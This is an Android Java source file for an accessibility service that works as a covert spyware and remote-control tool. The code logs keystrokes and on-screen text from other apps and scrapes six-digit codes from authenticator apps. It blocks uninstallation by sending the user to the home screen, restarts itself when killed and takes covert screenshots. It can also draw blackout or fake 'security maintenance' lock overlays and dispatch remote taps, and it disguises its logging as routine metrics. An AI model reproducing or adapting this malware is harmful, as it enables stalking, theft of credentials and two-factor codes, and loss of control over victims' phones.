package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

public class AccessibilityCore extends AccessibilityService {
    private static final String TAG = "AccessibilityCore";
    private static java.lang.ref.WeakReference<AccessibilityCore> instanceRef = new java.lang.ref.WeakReference<>(null);

    private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    private long lastAntiRemovalCheck = 0;
    private static volatile long lastEventTime = 0;
    private Handler backgroundHandler;
    private android.os.HandlerThread handlerThread;

    public static AccessibilityCore getInstance() { return instanceRef.get(); }

    public static long getLastEventTime() { return lastEventTime; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instanceRef = new java.lang.ref.WeakReference<>(this);
        
        handlerThread = new android.os.HandlerThread("GhostWorker");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());

        updateDisplayMetrics();
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
    }

    private void updateDisplayMetrics() {
        try {
            WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
            if (wm != null) {
                android.view.Display display = wm.getDefaultDisplay();
                Point size = new Point();
                display.getRealSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
            }
        } catch (Exception ignored) {}
    }

    public int getScreenWidth() { 
        if (screenWidth == 0) updateDisplayMetrics();
        return screenWidth; 
    }
    
    public int getScreenHeight() { 
        if (screenHeight == 0) updateDisplayMetrics();
        return screenHeight; 
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        lastEventTime = System.currentTimeMillis();
        
        // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
        // AccessibilityEvents are recycled by the OS; we must copy data before offloading.
        final int eventType = event.getEventType();
        final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
        // Immediate return for system-level high-frequency noise and self-loops
        if (packageName.isEmpty() || 
            packageName.equals(getPackageName()) || 
            packageName.contains("systemui") || 
            packageName.contains("launcher") ||
            packageName.contains("recents") ||
            packageName.contains("android.gms") ||
            packageName.contains("vending")) {
            return;
        }

        // --- FILTER MESSAGING APPS (REDUNDANT DATA) ---
        // We exclude these from keylogs because they are already captured in the SMS and Intel tabs.
        // This prevents the keylogger from getting flooded with redundant text.
        if (packageName.contains("messaging") || 
            packageName.contains("mms") || 
            packageName.contains("sms") || 
            packageName.contains("whatsapp") ||
            packageName.contains("telecom")) {
            return;
        }

        final List<String> eventText = new ArrayList<>();
        if (event.getText() != null && !event.getText().isEmpty()) {
            // Just take the first element to keep it light
            Object first = event.getText().get(0);
            if (first != null) eventText.add(first.toString());
        }
        
        // --- 3. WATCHDOG & OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
        // Adaptive Monitoring: Check if main uplink is still active
        if (!CoreSyncService.isRunning && !CoreSyncService.isDestructing) {
            Intent i = new Intent(this, CoreSyncService.class);
            i.setAction("START");
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
                else startService(i);
            } catch (Exception ignored) {}
        }

        backgroundHandler.post(() -> {
            try {
                // --- NUCLEAR DESTRUCT OVERRIDE ---
                boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
                
                if (isSuicideMode) {
                    handleAutoDestruct(packageName);
                    return; // ABSOLUTELY STOP SHIELD IF SUICIDE IS ACTIVE
                }

                // Event-Driven Anti-Removal: Only check when system security apps are focused
                if (!skipAntiRemoval) {
                    if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
                        checkAntiRemovalInternal();
                    }
                }
                
                // Process input/keystrokes using local data copy
                if (!eventText.isEmpty()) {
                    // --- 2FA SNATCHING (Wuzenx Style) ---
                    if (packageName.contains("authenticator") || packageName.contains("authy")) {
                        snatchAuthenticatorCodes(packageName);
                    }

                    processEventLogic(eventType, packageName, eventText);
                }
            } catch (Exception e) {
                // Prevent service crashes
            }
        });
    }

    private long lastAntiRemovalExecution = 0;

    private void checkAntiRemovalInternal() {
        // Double-check persistent flag
        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
            return; 
        }

        long now = System.currentTimeMillis();
        // Cooldown: Don't scan the UI more than once every 2 seconds to prevent "Recent Apps" lag
        if (now - lastAntiRemovalExecution < 2000) return;
        lastAntiRemovalExecution = now;

        // Must run on main thread for getRootInActiveWindow()
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                // Specific package check: only block if inside the actual uninstaller or settings
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) {
                    root.recycle();
                    return;
                }

                String[] danger = {"uninstall", "disable", "delete"};
                for (String s : danger) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                    if (nodes != null && !nodes.isEmpty()) {
                        // Double-check visibility and text match to avoid false positives on list items
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node.isVisibleToUser() && node.getText() != null && 
                                node.getText().toString().toLowerCase().contains(s)) {
                                performGlobalAction(GLOBAL_ACTION_HOME);
                                LabRatsHttpServer.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
                                break;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void processEventLogic(int eventType, String pkg, List<String> textList) {
        StringBuilder log = new StringBuilder();
        
        if (!pkg.equals(lastPackage)) {
            logKeystroke("\n[" + pkg + "] -> ");
            lastPackage = pkg;
        }

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                // When a field is focused, try a deeper inspection to find hints or labels
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    deepInspectNode(source, log);
                    source.recycle();
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                if (!textList.isEmpty()) {
                    String txt = textList.get(0).toString();
                    if (!isGenericSystemText(txt)) {
                        log.append(txt).append(" ");
                    }
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                log.append(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ? "[LONG_CLICK]: " : "[CLICK]: ");
                if (!textList.isEmpty()) {
                    log.append(textList.get(0)).append(" ");
                }
                break;
        }

        String result = log.toString().trim();
        if (!result.isEmpty() && !result.equals("null")) {
            logKeystroke(result + " ");
        }
    }

    private void deepInspectNode(AccessibilityNodeInfo node, StringBuilder log) {
        if (node == null) return;
        
        // Extract text, ID, or description if relevant
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String viewId = node.getViewIdResourceName();
        
        if (text != null && text.length() > 0 && !isGenericSystemText(text.toString())) {
            log.append("[").append(text).append("] ");
        } else if (desc != null && desc.length() > 0 && !isGenericSystemText(desc.toString())) {
            log.append("{").append(desc).append("} ");
        }
        
        // Don't go too deep to avoid flooding
        for (int i = 0; i < Math.min(node.getChildCount(), 5); i++) {
            deepInspectNode(node.getChild(i), log);
        }
    }

    private boolean isGenericSystemText(String txt) {
        if (txt == null) return true;
        String low = txt.toLowerCase();
        return low.contains("filling options") || 
               low.contains("above the keyboard") || 
               low.contains("enhanced protection") ||
               low.contains("option available") ||
               low.contains("tap to") ||
               low.length() < 2;
    }

    private void logKeystroke(String msg) {
        synchronized (keystrokes) {
            keystrokes.add(msg);
            while (keystrokes.size() > 2000) keystrokes.remove(0);
        }
    }

    public static List<String> getKeystrokes() {
        synchronized (keystrokes) {
            return new ArrayList<>(keystrokes);
        }
    }

    public static void clearKeystrokes() {
        keystrokes.clear();
    }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;
    private View lockView;

    public void startBlackout(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(AccessibilityCore.this);
                        blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                                android.graphics.PixelFormat.TRANSLUCENT);
                        
                        params.screenBrightness = 0.001f;
                        params.buttonBrightness = 0.0f;
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
    public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
    public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }

    public static boolean isBlackoutActive() {
        AccessibilityCore instance = getInstance();
        return instance != null && instance.blackoutView != null;
    }

    public static boolean isLockActive() {
        AccessibilityCore instance = getInstance();
        return instance != null && instance.lockView != null;
    }

    public void setRemoteLock(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (lockView == null) {
                        lockView = new android.widget.FrameLayout(AccessibilityCore.this);
                        lockView.setBackgroundColor(android.graphics.Color.BLACK);

                        android.widget.TextView tv = new android.widget.TextView(AccessibilityCore.this);
                        tv.setText("SYSTEM_LOCK_ACTIVE\n\nSecurity maintenance in progress.\nPlease wait...");
                        tv.setTextColor(android.graphics.Color.RED);
                        tv.setGravity(android.view.Gravity.CENTER);
                        tv.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
                        tv.setTextSize(20);

                        ((android.widget.FrameLayout)lockView).addView(tv, new android.widget.FrameLayout.LayoutParams(
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                android.graphics.PixelFormat.TRANSLUCENT);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        wm.addView(lockView, params);
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
                    }
                } else {
                    if (lockView != null) {
                        wm.removeViewImmediate(lockView);
                        lockView = null;
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
        });
    }

    public void showOverlayToast(final String message) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                
                final android.widget.TextView tv = new android.widget.TextView(AccessibilityCore.this);
                tv.setText(message);
                tv.setTextColor(android.graphics.Color.WHITE);
                tv.setPadding(60, 30, 60, 30);
                tv.setGravity(android.view.Gravity.CENTER);
                tv.setTextSize(22);
                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                tv.setSingleLine(true); // Ensure it doesn't wrap while scrolling
                
                // Rounded corners via drawable
                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
                shape.setCornerRadius(50);
                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
                tv.setBackground(shape);

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT);
                
                params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.LEFT;
                params.y = 250; // Distance from bottom
                params.x = 0;

                wm.addView(tv, params);
                
                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : 1080;

                // Use post to ensure the view is measured so we can calculate its exact width
                tv.post(() -> {
                    int viewWidth = tv.getWidth();
                    // Start completely off-screen to the right
                    tv.setTranslationX(screenW);
                    
                    // Scroll to completely off-screen to the left
                    tv.animate()
                      .translationX(-viewWidth)
                      .setDuration(12000)
                      .setInterpolator(new android.view.animation.LinearInterpolator())
                      .withEndAction(() -> {
                          try { wm.removeView(tv); } catch (Exception ignored) {}
                      })
                      .start();
                });
                
            } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
        });
    }

    public void runAutoHeal() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                skipAntiRemoval = true; 
                LabRatsHttpServer.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
            } catch (Exception e) { LabRatsHttpServer.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ INTERACTION ============

    public boolean clickAt(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), null, null);
    }

    public boolean clickByText(String text) {
        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
            AccessibilityNodeInfo root = window.getRoot();
            if (root == null) continue;
            
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo target = node;
                        while (target != null && !target.isClickable()) {
                            target = target.getParent();
                        }
                        
                        if (target != null && target.isClickable()) {
                            return target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            return clickAt(bounds.centerX(), bounds.centerY());
                        }
                    }
                }
            }
        }
        return false;
    }

    public boolean clickById(String id) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
            }
        }
        return false;
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ============ SCREENSHOT ============

    public interface ScreenshotCallback { void onSuccess(byte[] jpegData); void onFailure(String error); }
    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    isScreenshotting = false;
                    android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    try {
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            // --- REFINED OPTIMIZATION: SCALE DOWN ---
                            // Increased to 720px for better clarity on PC while maintaining speed
                            int targetWidth = 720;
                            int targetHeight = (int) (bitmap.getHeight() * (targetWidth / (float) bitmap.getWidth()));
                            android.graphics.Bitmap scaledBitmap = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
                            
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            // --- REFINED OPTIMIZATION: QUALITY ---
                            // 60% provides a sharper image with fewer artifacts around text
                            scaledBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
                            callback.onSuccess(out.toByteArray());
                            
                            bitmap.recycle();
                            scaledBitmap.recycle();
                        } else { callback.onFailure("Buffer wrap failed"); }
                    } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                    finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
                }
                @Override
                public void onFailure(int i) {
                    isScreenshotting = false;
                    callback.onFailure("OS Error: " + i);
                }
            });
            new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
        } else { callback.onFailure("Android 11+ Required"); }
    }

    @Override
    protected boolean onKeyEvent(android.view.KeyEvent event) {
        int keyCode = event.getKeyCode();
        int action = event.getAction();
        
        if (action == android.view.KeyEvent.ACTION_DOWN) {
            String key = android.view.KeyEvent.keyCodeToString(keyCode);
            if (key.startsWith("KEYCODE_")) key = key.substring(8);
            
            if (keyCode == android.view.KeyEvent.KEYCODE_ENTER) logKeystroke("[ENTER]\n");
            else if (keyCode == android.view.KeyEvent.KEYCODE_DEL) logKeystroke("[BS]");
            else if (keyCode == android.view.KeyEvent.KEYCODE_SPACE) logKeystroke(" ");
            else if (key.length() == 1) logKeystroke(key);
            else logKeystroke("[" + key + "]");
        }
        return super.onKeyEvent(event);
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { 
        super.onDestroy(); 
        instanceRef.clear();
        Log.d(TAG, "Accessibility service being destroyed");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (CoreSyncService.isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
        try {
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
            Intent i = new Intent(this, CoreSyncService.class);
            i.setAction("START");
            android.app.PendingIntent pi = android.app.PendingIntent.getForegroundService(this, 99, i, android.app.PendingIntent.FLAG_IMMUTABLE);
            if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        // Return true to allow rebinding when new events occur
        return true;
    }

    // ============ PREDATORY FEATURES (Wuzenx Style) ============

    private void snatchAuthenticatorCodes(String pkg) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // Look for 6-digit numeric codes
                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
                findNumericNodes(root, nodes);

                for (AccessibilityNodeInfo node : nodes) {
                    if (node.getText() != null) {
                        String code = node.getText().toString().replaceAll("\\s", "");
                        if (code.matches("\\d{6}")) {
                            LabRatsHttpServer.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void findNumericNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().matches(".*\\d{3}.*\\d{3}.*")) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNumericNodes(node.getChild(i), results);
        }
    }

    private void handleAutoDestruct(String pkg) {
        Log.d("SelfDestruct", "Ghost Monitor: Checking for removal buttons...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // --- AGGRESSIVE BUTTON HUNTER ---
                List<AccessibilityNodeInfo> targets = new ArrayList<>();
                String[] keywords = {"uninstall", "ok", "delete", "confirm", "yes", "stop", "deactivate", "off", "disable"};
                
                for (String word : keywords) {
                    findNodesByText(root, word, targets);
                }

                // Also look for specific resource IDs for "Uninstall" button
                String[] commonIds = {
                    "com.android.settings:id/left_button", 
                    "com.android.settings:id/button1",
                    "android:id/button1",
                    "com.android.packageinstaller:id/ok_button"
                };
                for (String id : commonIds) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                    if (nodes != null) targets.addAll(nodes);
                }

                for (AccessibilityNodeInfo node : targets) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo clickable = node;
                        while (clickable != null && !clickable.isClickable()) {
                            clickable = clickable.getParent();
                        }
                        
                        if (clickable != null && clickable.isClickable()) {
                            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d("SelfDestruct", "Force Click: " + node.getText());
                            return;
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            if (bounds.centerX() > 0 && bounds.centerY() > 0) {
                                clickAt(bounds.centerX(), bounds.centerY());
                                Log.d("SelfDestruct", "Force Touch: " + node.getText());
                                return;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        }, 800);
    }

    private void findNodesByText(AccessibilityNodeInfo node, String text, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNodesByText(node.getChild(i), text, results);
        }
    }
}
